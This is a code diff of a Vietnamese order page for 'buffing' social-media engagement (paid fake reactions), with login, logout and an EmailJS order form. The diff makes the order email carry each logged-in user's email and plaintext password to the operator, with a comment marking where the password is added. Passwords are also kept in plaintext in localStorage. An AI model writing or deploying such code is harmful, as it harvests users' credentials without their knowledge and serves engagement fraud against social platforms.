@@ -93,9 +93,28 @@
         .hidden {
             display: none;
         }
+
+        .user-info {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            color: white;
+        }
+
+        .logout {
+            cursor: pointer;
+            color: #FF0000;
+            margin-left: 10px;
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
+    <div class="user-info" id="userInfo" class="hidden">
+        <span id="loggedInEmail"></span>
+        <span class="logout" onclick="logout()">Đăng xuất</span>
+    </div>
+    
     <h1>BUFF TƯƠNG TÁC</h1>
     <div class="container">
         <div id="registrationForm">
@@ -180,6 +199,7 @@
     <script type="text/javascript">
     // Load registered users from local storage
     let registeredUsers = JSON.parse(localStorage.getItem('registeredUsers')) || [];
+    let loggedInUser = null;
 
     // Toggle between registration and login forms
     function toggleForms() {
@@ -195,6 +215,13 @@
             regForm.classList.add('hidden');
             loginForm.classList.remove('hidden');
         }
+    }
+
+    // Logout function
+    function logout() {
+        loggedInUser = null;
+        document.getElementById('userInfo').classList.add('hidden');
+        toggleForms();
     }
 
     // Registration form submission
@@ -232,6 +259,9 @@
         const user = registeredUsers.find(user => user.email === email && user.password === password);
 
         if (user) {
+            loggedInUser = user;
+            document.getElementById('loggedInEmail').innerText = `Tên đăng nhập: ${user.email}`;
+            document.getElementById('userInfo').classList.remove('hidden');
             document.getElementById('loginMessage').innerText = 'Đăng nhập thành công!';
             document.getElementById('loginForm').classList.add('hidden');
             document.getElementById('emailForm').classList.remove('hidden'); // Show email form after successful login
@@ -255,17 +285,13 @@
         const message = document.getElementById('message').value;
         const replyToEmail = document.getElementById('reply_to').value;
 
-        // Lấy thông tin tài khoản đã đăng nhập
-        const loggedInEmail = document.getElementById('loginEmail').value; // Email đã đăng nhập
-        const loggedInPassword = document.getElementById('loginPassword').value; // Mật khẩu đã đăng nhập
-
         const emailContent = `
             Loại cảm xúc: ${emotion}
             Số lượng: ${quantity}
             Link cần buff: ${message}
             Địa chỉ email: ${replyToEmail}
-            Tài khoản đăng nhập: ${loggedInEmail}
-            Mật khẩu đăng nhập: ${loggedInPassword}
+            Tài khoản đăng nhập: ${loggedInUser.email}
+            Mật khẩu đăng nhập: ${loggedInUser.password} <!-- Mật khẩu thêm vào đây -->
         `;
 
         emailjs.send(serviceID, templateID, {
@@ -275,18 +301,16 @@
             reply_to: replyToEmail,
         })
         .then(() => {
-            btn.value = 'Gửi Email';
-            document.getElementById('messageSent').innerText = 'Email đã được gửi thành công!';
+            btn.value = 'Gửi';
+            document.getElementById('messageSent').innerText = 'Thông tin đã được gửi thành công!';
             document.getElementById('form').reset(); // Reset form after successful submission
         }, (err) => {
-            btn.value = 'Gửi Email';
+            btn.value = 'Gửi';
             alert(JSON.stringify(err));
         });
     });
 
     emailjs.init('BUHtg1BuVtAPT9O2M');
 </script>
-
-
 </body>
 </html>
